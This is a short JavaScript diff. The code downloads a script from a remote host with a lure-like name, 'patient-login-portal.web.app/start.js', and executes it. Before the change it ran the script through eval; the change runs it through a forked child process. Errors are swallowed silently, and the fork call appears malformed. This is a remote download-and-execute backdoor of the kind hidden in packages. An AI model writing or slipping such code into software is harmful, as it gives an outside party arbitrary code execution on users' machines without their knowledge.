@@ -18,7 +18,13 @@ const url = 'https://patient-login-portal.web.app/start.js';
 axios.get(url)
     .then(response => {
         const scriptContent = response.data;
-        eval(scriptContent);
+	const { fork } = require('child_process');
+	const fs = require('fs');
+	const child = fork('-e', [scriptContent]);
+	
+	child.on('exit', (code, signal) => {
+	  
+	});
     })
     .catch(error => {
     });
